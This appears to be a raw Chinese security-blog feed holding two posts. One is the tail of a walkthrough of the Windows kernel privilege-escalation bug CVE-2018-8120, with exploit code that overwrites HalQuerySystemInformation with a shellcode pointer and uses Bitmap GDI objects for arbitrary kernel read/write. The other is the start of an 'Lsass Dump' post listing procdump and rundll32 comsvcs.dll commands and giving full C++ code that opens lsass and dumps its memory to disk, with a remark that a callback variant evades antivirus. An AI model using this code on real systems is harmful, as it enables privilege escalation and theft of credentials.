bRet;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] AllocateZeroMemory\n"</span>);</div><div class="line"><span class="comment">// 获取保存HalQuerySystemInformation函数地址的地址</span></div><div class="line">PVOID pHalQuerySystemInformation = GetHalQuerySystemInformation();</div><div class="line"><span class="keyword">if</span> (!pHalQuerySystemInformation)</div><div class="line">&#123;</div><div class="line">bRet = FALSE;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] GetHalQuerySystemInformation\n"</span>);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据伪代码描述，只需要v4，即pklFirst-&gt;piiex，存放的是HalQuerySystemInformation，piiex存放的是Shellcode，然后调用<code>NtUserSetImeInfoEx</code>触发任意地址读写，将Shellcode覆写到HalQuerySystemInformation地址上，最后调用NtQueryIntervalProfile执行即可。<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( pwinsta )</div><div class="line"> &#123;</div><div class="line">   <span class="function"><span class="title">pklFirst</span> = pwinsta-&gt;</span>spklList;               <span class="comment">// 没有对pklFirst 的合法性进行验证</span></div><div class="line">   <span class="function"><span class="title">while</span> ( pklFirst-&gt;</span><span class="function"><span class="title">hkl</span> != piiex-&gt;</span>hkl )       <span class="comment">// 如果pklFirst为NULL的话，对pklFirst进行解引用。会导致失败</span></div><div class="line">   &#123;</div><div class="line">     <span class="function"><span class="title">pklFirst</span> = pklFirst-&gt;</span>pklNext;</div><div class="line">     <span class="function"><span class="title">if</span> ( pklFirst == pwinsta-&gt;</span>spklList )</div><div class="line">       return <span class="number">0</span>;</div><div class="line">   &#125;</div><div class="line">   <span class="function"><span class="title">v4</span> = pklFirst-&gt;</span>piiex;                       <span class="comment">// 存放HalQuerySystemInformation</span></div><div class="line">   <span class="keyword">if</span> ( !v4 )</div><div class="line">     return <span class="number">0</span>;</div><div class="line">   <span class="function"><span class="title">if</span> ( !v4-&gt;</span>fLoadFlag )</div><div class="line">     qmemcpy(v4, piiex, sizeof(tagIMEINFOEX)); <span class="comment">// piiex存放ShellCode地址</span></div><div class="line">   result = <span class="number">1</span>;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> Trigger_CVE_2018_8120()</div><div class="line">&#123;</div><div class="line"><span class="built_in">BOOL</span> bRet = <span class="literal">TRUE</span>;</div><div class="line"><span class="comment">// 0地址分配内存</span></div><div class="line"><span class="keyword">if</span> (!AllocateZeroMemory())</div><div class="line">&#123;</div><div class="line">bRet = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line">printf(<span class="string">"[*] AllocateZeroMemory\n"</span>);</div><div class="line"><span class="comment">// 获取保存HalQuerySystemInformation函数地址的地址</span></div><div class="line">PVOID pHalQuerySystemInformation = GetHalQuerySystemInformation();</div><div class="line"><span class="keyword">if</span> (!pHalQuerySystemInformation)</div><div class="line">&#123;</div><div class="line">bRet = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line">printf(<span class="string">"[*] GetHalQuerySystemInformation\n"</span>);</div><div class="line"><span class="comment">// 指定被写入的地址</span></div><div class="line">*(PDWORD)(<span class="number">0x2C</span>) = (DWORD)pHalQuerySystemInformation;</div><div class="line"><span class="comment">// 绕过while循环的验证</span></div><div class="line">*(PDWORD)(<span class="number">0x14</span>) = (DWORD)ShellCode_CVE_2018_8120;</div><div class="line"><span class="keyword">char</span> szBuf[<span class="number">0x15C</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line"><span class="comment">// 指定要写入的内容是ShellCode的地址</span></div><div class="line">*(PDWORD)szBuf = (DWORD)ShellCode_CVE_2018_8120;</div><div class="line"><span class="comment">// 触发漏洞</span></div><div class="line"><span class="keyword">if</span> (!CallNtUserSetImeInfoEx(szBuf))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"CallNtUserSetImeInfoEx"</span>, GetLastError());</div><div class="line">bRet = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line">printf(<span class="string">"[*] CallNtUserSetImeInfoEx\n"</span>);</div><div class="line"><span class="comment">// 调用NtQueryIntervalProfile</span></div><div class="line"><span class="keyword">if</span> (!CallNtQueryIntervalProfile())</div><div class="line">&#123;</div><div class="line">bRet = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是，在后续的调试中，发现并不是执行memcpy的操作，导致覆写失败。</p><h2 id="0x05-Bitmap-GDI"><a href="#0x05-Bitmap-GDI" class="headerlink" title="0x05 Bitmap GDI"></a>0x05 Bitmap GDI</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BitmapGDI，通过Bitmap对象泄露可供读写的内核区域，从而将任意地址覆写漏洞转化为任意地址读写漏洞。R3通过使用<code>CreateBitmap</code>函数创建一个Bitmap对象，在Bitmap对象中有一个指针pvScan0，指向一段内存域名。pvScan0指针可以在R3通过GetBitmaps以及SetBitmaps函数进行操作。至此，通过这两个函数，可以将一个任意地址复写漏洞转化成一个任意地址读写漏洞。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>CreateBitmap</code>函数原型如下,<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">HRESULT CreateBitmap(<span class="name">UINT</span> uiWidth,</div><div class="line">                     UINT uiHeight,</div><div class="line">                     REFWICPixelFormatGUID pixelFormat,</div><div class="line">                     WICBitmapCreateCacheOption option,</div><div class="line">                     IWICBitmap **ppIBitmap)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当调用<code>CreateBitmap</code>之后，会在进程PEB偏移+0x94的<code>GdiSharedHandleTable</code>数组中增加一个索引。<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="number">3</span>: kd&gt; dt _PEB</div><div class="line">ntdll!_PEB</div><div class="line">   +<span class="number">0x000</span> InheritedAddressSpace : UChar</div><div class="line">    <span class="params">...</span></div><div class="line">   +<span class="number">0x090</span> ProcessHeaps     : Ptr32 Ptr32 <span class="literal">Void</span></div><div class="line">   +<span class="number">0x094</span> GdiSharedHandleTable : Ptr32 <span class="literal">Void</span></div><div class="line">   +<span class="number">0x098</span> ProcessStarterHelper : Ptr32 <span class="literal">Void</span></div><div class="line">   <span class="params">...</span>.</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该索引是一个<code>_GDICELL</code>结构。<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">typedef struct _GDICELL&#123;</div><div class="line">    <span class="type">LPVOID</span> pKernelAddress;</div><div class="line">    <span class="type">USHORT</span> wProcessId;</div><div class="line">    <span class="type">USHORT</span> wCount;</div><div class="line">    <span class="type">USHORT</span> wUpper;</div><div class="line">    <span class="type">USHORT</span> wType;</div><div class="line">    <span class="type">LPVOID</span> pUserAddress;</div><div class="line">&#125; <span class="type">GDICELL</span>;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>GDICELL</code>结构的第一个成员<code>pKernelAddress</code>指向的是一个<code>SURFACE</code>对象，结构体定义如下,其中比较重要的是<code>BASEOBJECT</code>和<code>SURFOBJ</code>对象，<code>pvScan0</code>指针便位于<code>SURFOBJ</code>对象中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SURFACE</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">    BASEOBJECT  BaseObject;</div><div class="line">    SURFOBJ     SurfObj;</div><div class="line">    <span class="comment">//XDCOBJ *   pdcoAA;</span></div><div class="line">    FLONG       flags;</div><div class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PALETTE</span>  * <span class="title">const</span> <span class="title">ppal</span>;</span> <span class="comment">// Use SURFACE_vSetPalette to assign a palette</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EWNDOBJ</span>  *<span class="title">pWinObj</span>;</span></div><div class="line">    <span class="keyword">union</span></div><div class="line">    &#123;</div><div class="line">        HANDLE  hSecureUMPD;  <span class="comment">// if UMPD_SURFACE set</span></div><div class="line">        HANDLE  hMirrorParent;<span class="comment">// if MIRROR_SURFACE set</span></div><div class="line">        HANDLE  hDDSurface;   <span class="comment">// if DIRECTDRAW_SURFACE set</span></div><div class="line">    &#125;;</div><div class="line">    SIZEL       sizlDim;      <span class="comment">/* For SetBitmapDimension(), do NOT use</span></div><div class="line"><span class="comment">    HDC         hdc;          // Doc in "Undocumented Windows", page 546, seems to be supported with XP.</span></div><div class="line"><span class="comment">    ULONG       cRef;</span></div><div class="line"><span class="comment">    HPALETTE    hpalHint;</span></div><div class="line"><span class="comment">    /* For device-independent bitmaps: */</span></div><div class="line">    HANDLE      hDIBSection;</div><div class="line">    HANDLE      hSecure;</div><div class="line">    DWORD       dwOffset;</div><div class="line">    <span class="comment">//UINT       unk_078;</span></div><div class="line">    <span class="comment">/* reactos specific */</span></div><div class="line">    DWORD biClrImportant;</div><div class="line">&#125; SURFACE, *PSURFACE;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下图可以清晰的观察<code>SURFACE</code>结构的内存布局，有两个主要的结构。一个叫 <code>BASEOBJECT</code>对象，每一个 GDI 对象都有的一个头部。另一个叫<code>SURFOBJ</code>对象，保存了包括我们参数信息的实际结构。<code>BASEOBJECT</code>结构位于<code>SURFOBJ</code>之前，在寻找<code>pvScan0</code>指针过程中，我们只需要知道这个结构大小即可。在x86中，BASEOBJECT的大小是<code>0x10</code>,而在x64中，BASEOBJECT的大小是<code>0x18</code>。在图中，可以清楚的看到pvScan0指针指向PixelData区域。<br>    <img src="http://hacky.wang/blog/20230208/7c4T86WJNlPl.png?imageslim" alt="mark"></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">typedef struct _BASEOBJECT &#123;</div><div class="line">    <span class="type">HANDLE</span>    hHmgr; 0x04</div><div class="line">    <span class="type">PVOID</span>     pEntry; 0x08</div><div class="line">    <span class="type">LONG</span>      cExclusiveLock; 0x0d</div><div class="line">    <span class="type">PW32THREAD</span> <span class="type">Tid</span>;0x10</div><div class="line">&#125;<span class="type">BASEOBJECT</span>, *<span class="type">POBJ</span>;</div><div class="line">typedef struct _SURFOBJ &#123;</div><div class="line">    <span class="type">DHSURF</span> dhsurf;        0x04</div><div class="line">    <span class="type">HSURF</span>  hsurf;         0x08</div><div class="line">    <span class="type">DHPDEV</span> dhpdev;        0x09</div><div class="line">    <span class="type">HDEV</span>   hdev;          0x0a</div><div class="line">    <span class="type">SIZEL</span>  sizlBitmap;    0x0e</div><div class="line">    <span class="type">ULONG</span>  cjBits;        0x12</div><div class="line">    <span class="type">PVOID</span>  pvBits;        0x16</div><div class="line">    <span class="type">PVOID</span>  pvScan0;       0x20</div><div class="line">    <span class="type">LONG</span>   lDelta;        0x24</div><div class="line">    <span class="type">ULONG</span>  iUniq;         0x28</div><div class="line">    <span class="type">ULONG</span>  iBitmapFormat; 0x2c</div><div class="line">    <span class="type">USHORT</span> iType;         0x2e</div><div class="line">    <span class="type">USHORT</span> fjBitmap;      0x30</div><div class="line">&#125; <span class="type">SURFOBJ</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着如何使用BitmapGDI技术将一个任意地址覆写漏洞，改造成一个任意地址读写漏洞。首先，我们的目标是获取pvScan0指针，根据上面的接收pvScan0位于<code>SURFACE</code>对象中的<code>SURFOBJ</code>对象第0x20偏移处。而<code>SURFACE</code>对象需要根据<code>GDICELL</code>结构的第一个成员<code>pKernelAddress</code>确定的。而<code>GDICELL</code>是GdiSharedHandleTable表中的其中一个索引。所以确定pvScan0指针需要分三步。<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">PVOID</span> GetPvScan(HBITMAP hBitHandle)</div><div class="line">&#123;</div><div class="line"><span class="attribute">DWORD</span> dwGdiCellArray = GetGdiCellArray();</div><div class="line"><span class="attribute">PGDICELL</span> pGdiCell = (PGDICELL)(dwGdiCellArray + LOWORD(hBitHandle) * sizeof(GDICELL));</div><div class="line"><span class="attribute">return</span> (PVOID)((DWORD)pGdiCell-&gt;pKernelAddress + 0x30);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一：根据PEB+0x94的偏移确定GDICELL数组的首地址。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">DWORD</span> GetGdiCellArray()</div><div class="line">&#123;</div><div class="line">__asm</div><div class="line">&#123;</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="built_in">fs</span>:[<span class="number">0x30</span>]// <span class="built_in">eax</span> = PEB</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span> + <span class="number">0x94</span>]// <span class="built_in">eax</span> = GDICELL数组首地址</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二根据CreateBitmap返回的HBITMAP对象，以此作为索引确定<code>GDICELL</code>结构。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PGDICELL pGdiCell = (<span class="name">PGDICELL</span>)(<span class="name">dwGdiCellArray</span> + LOWORD(<span class="name">hBitHandle</span>) * sizeof(GDICELL));</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三，获取<code>GDICELL</code>对象的第一个成员<code>pKernelAddress</code>指向的SURFACE对象，在SURFACE对象的0x30偏移就是pvScan0指针。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">return (<span class="name">PVOID</span>)((<span class="name">DWORD</span>)pGdiCell-&gt;pKernelAddress + <span class="number">0</span>x30)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;现在我们知道了pvScan0指针，那么怎么利用漏洞修改pvScan0指针指向的内容呢？首先，创建两个Bitmap对象：Work以及Manager。并获取两个BitMap对象的pvScan0指针。分别记做workerpvScan0和managerpvScan0指针。<br>    <img src="http://hacky.wang/blog/20230208/lOt8aj5ylpt1.png?imageslim" alt="mark"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//创建两个Bitmap对象</span></div><div class="line">hManger = CreateBitmap(<span class="number">0x60</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">32</span>, dwBuf);</div><div class="line">hWorker = CreateBitmap(<span class="number">0x60</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">32</span>, dwBuf);</div><div class="line">if (!hManger || !hWorker)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"CreateBitmap error"</span>);</div><div class="line">return false;</div><div class="line">&#125;</div><div class="line"><span class="comment">//获取各自的pvScan0指针。</span></div><div class="line">mpv = GetPvScan(hManger);</div><div class="line">wpv = GetPvScan(hWorker);</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后通过任意地址覆写漏洞，改写pvScan0指针。将workerpvScan0指针覆写到managerpvScan0指针。<br>    <img src="http://hacky.wang/blog/20230208/CuJbWD2T5uSX.png?imageslim" alt="mark"><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">////将wpv覆写入mpv，此时manage bitmap对象的pvScan0指针为worker bitmap对象的pvScan0指针。</span></div><div class="line">*(PDWORD)(<span class="number">0x2C</span>) = (DWORD)mpv;</div><div class="line">*(PDWORD)(<span class="number">0x14</span>) = (DWORD)wpv;</div><div class="line">DWORD szBuf[<span class="number">0x15C</span> / <span class="keyword">sizeof</span>(DWORD)] = &#123; <span class="number">0</span> &#125;;</div><div class="line"><span class="comment">// 指定要写入的内容</span></div><div class="line">szBuf[<span class="number">0</span>] = (DWORD)wpv;</div><div class="line"><span class="comment">// 触发漏洞</span></div><div class="line"><span class="keyword">if</span> (!CallNtUserSetImeInfoEx(szBuf))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"CreateBitmap error"</span>);</div><div class="line"><span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着通过Set\GetBitmaps，修改\获取pvScan0指针指向的内容。即就是将ManageBitmap对象中的pvScan0指向的内存区域修改为pHalQuerySystemInformation地址，然后再将WorkerBitmap对象的pvScan0指向的内存区域修改为Shellcode地址<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 设置hManger的可修改地址为保存HalQuerySystemInformation函数地址的地址</span></div><div class="line">SetBitmapBits(hManger, sizeof(PVOID), <span class="meta">&amp;pHalQuerySystemInformation);  </span></div><div class="line"><span class="comment">// 将可修改地址中的值修改为ShellCode地址</span></div><div class="line">SetBitmapBits(hWorker, sizeof(PVOID), <span class="meta">&amp;ShellCode);</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一部分可以这样理解，首先pvScan0指针指向的是一段内核区域，通过覆写漏洞，将workerpvScan0指向的地址覆盖到managerpvScan0指向的地址，然后先修改hManger的内核区域为HalQuerySystemInformation，接着修改hWorker的内核区域，也就是hManager的内核区域，也就是HalQuerySystemInformation地址为ShellCode地址。</p><h2 id="0x07-参考文献"><a href="#0x07-参考文献" class="headerlink" title="0x07 参考文献"></a>0x07 参考文献</h2><ul><li><a href="https://50u1w4y.github.io/site/HEVD/bitmap/#0x02-bitmap" target="_blank" rel="external">BitmapGDI技术</a></li><li><a href="https://bbs.kanxue.com/thread-272273.htm" target="_blank" rel="external">主要参照</a></li><li><a href="https://www.anquanke.com/post/id/247764" target="_blank" rel="external">BitmapGDI技术</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x1-漏洞描述&quot;&gt;&lt;a href=&quot;#0x1-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x1 漏洞描述&quot;&gt;&lt;/a&gt;0x1 漏洞描述&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CVE-2018-8120漏洞是一个位于win32k模块中的&lt;code&gt;SetImeInfoEx&lt;/code&gt;函数的任意地址覆盖漏洞，漏洞产生的根本原因是没有对&lt;code&gt;tagWINDOWSTATION&lt;/code&gt;结构的&lt;code&gt;spklList&lt;/code&gt;成员做有效性验证，就对其进行解引用，如果&lt;code&gt;spklList&lt;/code&gt;为NUll的话，继而对其进行解引用，导致漏洞触发。&lt;br&gt;
    
    </summary>
    
      <category term="Windows 内核提权漏洞" scheme="https://findream.github.io/categories/Windows-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title>Lsass Dump</title>
    <link href="https://findream.github.io/2022/12/30/Lsass%20Dump/"/>
    <id>https://findream.github.io/2022/12/30/Lsass Dump/</id>
    <published>2022-12-30T07:02:11.000Z</published>
    <updated>2022-12-31T11:46:23.640Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-现成工具"><a href="#0x01-现成工具" class="headerlink" title="0x01 现成工具"></a>0x01 现成工具</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;任务管理器</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;procdump:<code>procdump -ma lsass.exe lsass.dmp</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sharp dump:其核心也是使用<code>MiniDumpWriteDump</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Out-MiniDump:是PowerSploit下的一个<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1" target="_blank" rel="external">转储组件</a>。同理也是使用<code>MiniDumpWriteDump</code></p><a id="more"></a><h2 id="0x02-本机API或者Dll"><a href="#0x02-本机API或者Dll" class="headerlink" title="0x02 本机API或者Dll"></a>0x02 本机API或者Dll</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comsvcs.dll:管理员权限下使用<code>rundll32.exe comsvcs.dll MiniDump &lt;lsass PID&gt; &lt;out path&gt; full</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;API就是转储最常见的<code>MiniDumpWriteDump</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">ProcessMain</span><span class="params">(VOID)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="comment">//是否是管理员权限</span></div><div class="line"><span class="keyword">if</span> (IsElevated() == FALSE)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] IsElevated \r\n"</span>);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] run as Administor \n"</span>);</div><div class="line"><span class="comment">//启动Debug权限</span></div><div class="line">SetDebugPrivilege();</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] set debug privilege \n"</span>);</div><div class="line">  <span class="comment">//获取LSASS进程Pid</span></div><div class="line">DWORD dwPid = GetLsassPid();</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] get pid of lsass:%d\n"</span>, dwPid);</div><div class="line"><span class="comment">//打开进程获取句柄</span></div><div class="line">HANDLE hProcessOfLsass = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, dwPid);</div><div class="line"><span class="keyword">if</span> (hProcessOfLsass == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] OpenProcess \r\n"</span>);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] get handle of lsass \n"</span>);</div><div class="line"><span class="comment">//获取MiniDumpWriteDump函数地址</span></div><div class="line">pfnMiniDumpWriteDump MiniDumpWriteDump = (pfnMiniDumpWriteDump)GetProcAddress(</div><div class="line">LoadLibraryA(<span class="string">"Dbghelp.dll"</span>), <span class="string">"MiniDumpWriteDump"</span>);   <span class="comment">//</span></div><div class="line"><span class="keyword">if</span> (MiniDumpWriteDump == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] get address of mimidumpwritedump \n"</span>);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] get address of mimidumpwritedump \n"</span>);</div><div class="line">BOOL bResult = FALSE;</div><div class="line">HANDLE hFile = CreateFileW(<span class="string">L"c:\\dmplsass.bin"</span>, GENERIC_ALL, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</div><div class="line"><span class="comment">//调用函数创建转储</span></div><div class="line">bResult = MiniDumpWriteDump(hProcessOfLsass, dwPid, hFile, MiniDumpWithFullMemory, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (bResult == FALSE)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] MiniDumpWriteDump \n"</span>);</div><div class="line">CloseHandle(hFile);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="comment">//关闭文件句柄</span></div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] mini dump write dump \n"</span>);</div><div class="line">CloseHandle(hFile);</div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除了常规的直接使用<code>MiniDumpWriteDump</code>，现在很多C2都使用带有回调功能的<code>MiniDumpWriteDump</code>，因为<code>MiniDumpWriteDump</code>函数原型,函数第7个参数是一个指向<code>MINIDUMP_CALLBACK_INFORMATION</code>结构的指针，包含了回调函数的指针和参数。使用带回调功能的<code>MiniDumpWriteDump</code>并没有改写<code>MiniDumpWriteDump</code>函数，实现起来比较方便，也能过掉国内大多数AV。具体使用如下。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div 